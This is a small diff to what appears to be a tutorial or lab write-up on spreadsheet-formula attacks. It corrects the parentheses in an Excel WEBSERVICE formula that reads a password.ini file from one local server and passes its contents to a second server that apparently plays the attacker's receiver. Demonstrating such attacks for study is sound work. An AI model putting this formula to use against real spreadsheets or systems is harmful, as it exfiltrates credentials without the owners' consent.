@@ -126,7 +126,7 @@ We see a password.ini, let's check it out:
 ::
 
     =webservice("http://127.0.0.1:8001/?c="
-                & webservice("http://127.0.0.1:8000/password.ini")
+                & webservice("http://127.0.0.1:8000/password.ini"))
 
 .. image:: ../image/excel_ws_attack_server_2.png
 
